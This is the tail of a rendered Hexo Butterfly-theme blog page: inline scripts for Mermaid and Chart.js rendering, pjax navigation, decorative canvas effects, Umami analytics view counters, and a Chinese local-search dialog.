  const loadMermaid = () => {
    if (true) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.0/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script><script>(() => {
  const applyThemeDefaultsConfig = theme => {
    if (theme === 'dark-mode') {
      Chart.defaults.color = "rgba(255, 255, 255, 0.8)"
      Chart.defaults.borderColor = "rgba(255, 255, 255, 0.2)"
      Chart.defaults.scale.ticks.backdropColor = "transparent"
    } else {
      Chart.defaults.color = "rgba(0, 0, 0, 0.8)"
      Chart.defaults.borderColor = "rgba(0, 0, 0, 0.1)"
      Chart.defaults.scale.ticks.backdropColor = "transparent"
    }
  }

  // Recursively traverse the config object and automatically apply theme-specific color schemes
  const applyThemeConfig = (obj, theme) => {
    if (typeof obj !== 'object' || obj === null) return

    Object.keys(obj).forEach(key => {
      const value = obj[key]
      // If the property is an object and has theme-specific options, apply them
      if (typeof value === 'object' && value !== null) {
        if (value[theme]) {
          obj[key] = value[theme] // Apply the value for the current theme
        } else {
          // Recursively process child objects
          applyThemeConfig(value, theme)
        }
      }
    })
  }

  const runChartJS = ele => {
    window.loadChartJS = true

    Array.from(ele).forEach((item, index) => {
      const chartSrc = item.firstElementChild
      const chartID = item.getAttribute('data-chartjs-id') || ('chartjs-' + index) // Use custom ID or default ID
      const width = item.getAttribute('data-width')
      const existingCanvas = document.getElementById(chartID)

      // If a canvas already exists, remove it to avoid rendering duplicates
      if (existingCanvas) {
          existingCanvas.parentNode.remove()
      }

      const chartDefinition = chartSrc.textContent
      const canvas = document.createElement('canvas')
      canvas.id = chartID

      const div = document.createElement('div')
      div.className = 'chartjs-wrap'

      if (width) {
        div.style.width = width
      }

      div.appendChild(canvas)
      chartSrc.insertAdjacentElement('afterend', div)

      const ctx = document.getElementById(chartID).getContext('2d')

      const config = JSON.parse(chartDefinition)

      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark-mode' : 'light-mode'

      // Set default styles (initial setup)
      applyThemeDefaultsConfig(theme)

      // Automatically traverse the config and apply dual-mode color schemes
      applyThemeConfig(config, theme)

      new Chart(ctx, config)
    })
  }

  const loadChartJS = () => {
    const chartJSEle = document.querySelectorAll('#article-container .chartjs-container')
    if (chartJSEle.length === 0) return

    window.loadChartJS ? runChartJS(chartJSEle) : btf.getScript('https://cdn.jsdelivr.net/npm/chart.js@4.5.0/dist/chart.umd.min.js').then(() => runChartJS(chartJSEle))
  }

  // Listen for theme change events
  btf.addGlobalFn('themeChange', loadChartJS, 'chartjs')
  btf.addGlobalFn('encrypt', loadChartJS, 'chartjs')

  window.pjax ? loadChartJS() : document.addEventListener('DOMContentLoaded', loadChartJS)
})()</script></div><script data-pjax src="/self/btf.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="ture"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,200,200" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      true
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script>(() => {
  const option = null
  const config = {"site_uv":true,"site_pv":true,"page_pv":true,"token":"qTvz1SkmPDt785fgh6BpiA5qiFFIVUwxj8Ft+rPW+cdN59v1hXjwRgSmy0+ji9m+oLlcxvo2NfDSMa6epVl3NTlsN3ejCIwWeP8Y51aEJ0Sbem4UexGmJLspB7AkOBId2SdtT6QWEBlGmFIIQgchQ2zAKYxTmc/kpBED5aLSr+3uvmQ9/G7FJQeVFpveDkK0xM1hu36xq4a6/FSeROxtoEp5zabzTWiYTlLsQzIl/NlELnCq3nxK+oo/vl3UQo/oM/rae/gJX/MaVKsgIUCd2ABJogNkx2KTenBIBpbPki5FzOgPh6/z4GPa4HvhNO51DDVG1SEQZooqEYmt/gnybLBWFbN+7liZWw=="}

  const runTrack = () => {
    if (typeof umami !== 'undefined' && typeof umami.track === 'function') {
      umami.track(props => ({ ...props, url: window.location.pathname, title: GLOBAL_CONFIG_SITE.title }))
    } else {
      console.warn('Umami Analytics: umami.track is not available')
    }
  }

  const loadUmamiJS = () => {
    btf.getScript('https://umami.012700.xyz/script.js', {
      'data-website-id': '2a796d6c-6499-42d8-8eb4-d9a2930b0ff3',
      'data-auto-track': 'false',
      ...option
    }).then(() => {
      runTrack()
    }).catch(error => {
      console.error('Umami Analytics: Error loading script', error)
    })
  }

  const getData = async (isPost) => {
    try {
      const now = Date.now()
      const keyUrl = isPost ? `&url=${window.location.pathname}` : ''
      const headerList = { 'Accept': 'application/json' }

      if (true) {
        headerList['Authorization'] = `Bearer ${config.token}`
      } else {
        headerList['x-umami-api-key'] = config.token
      }

      const res = await fetch(`https://umami.012700.xyz/api/websites/2a796d6c-6499-42d8-8eb4-d9a2930b0ff3/stats?startAt=0000000000&endAt=${now}${keyUrl}`, {
        method: "GET",
        headers: headerList
      })

      if (!res.ok) {
        throw new Error(`HTTP error! status: ${res.status}`)
      }

      return await res.json()
    } catch (error) {
      console.error('Umami Analytics: Failed to fetch data', error)
      throw error
    }
  }

  const insertData = async () => {
    try {
      if (GLOBAL_CONFIG_SITE.pageType === 'post' && config.page_pv) {
        const pagePV = document.getElementById('umamiPV')
        if (pagePV) {
          const data = await getData(true)
          if (data && data.pageviews && typeof data.pageviews.value !== 'undefined') {
            pagePV.textContent = data.pageviews.value
          } else {
            console.warn('Umami Analytics: Invalid page view data received')
          }
        }
      }

      if (config.site_uv || config.site_pv) {
        const data = await getData(false)

        if (config.site_uv) {
          const siteUV = document.getElementById('umami-site-uv')
          if (siteUV && data && data.visitors && typeof data.visitors.value !== 'undefined') {
            siteUV.textContent = data.visitors.value
          } else if (siteUV) {
            console.warn('Umami Analytics: Invalid site UV data received')
          }
        }

        if (config.site_pv) {
          const sitePV = document.getElementById('umami-site-pv')
          if (sitePV && data && data.pageviews && typeof data.pageviews.value !== 'undefined') {
            sitePV.textContent = data.pageviews.value
          } else if (sitePV) {
            console.warn('Umami Analytics: Invalid site PV data received')
          }
        }
      }
    } catch (error) {
      console.error('Umami Analytics: Failed to insert data', error)
    }
  }

  btf.addGlobalFn('pjaxComplete', runTrack, 'umami_analytics_run_track')
  btf.addGlobalFn('pjaxComplete', insertData, 'umami_analytics_insert')


  loadUmamiJS()

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', insertData)
  } else {
    setTimeout(insertData, 100)
  }
})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.1"></script></div></div></body></html>